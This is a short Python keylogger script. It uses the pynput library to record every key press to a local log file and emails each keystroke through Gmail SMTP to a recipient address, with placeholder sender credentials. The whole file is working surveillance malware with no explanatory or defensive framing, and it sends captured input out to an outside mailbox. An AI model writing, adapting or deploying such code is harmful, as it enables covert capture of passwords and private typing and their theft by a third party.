import pynput
from pynput.keyboard import Key, Listener
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

log_dir = r"C:/Path/To/KeyLogger"
log_file_path = log_dir + r"/keyLog.txt"

logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')

sender_email = "your_email@gmail.com"
receiver_email = "recipient_email@gmail.com"
email_password = "your_email_password"
smtp_server = "smtp.gmail.com"
smtp_port = 587

def send_email(subject, body):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(sender_email, email_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())

def on_press(key):
    logging.info(str(key))
    subject = "Key Logger Update"
    body = f"Key pressed: {key}"
    send_email(subject, body)

with Listener(on_press=on_press) as listener:
    listener.join()
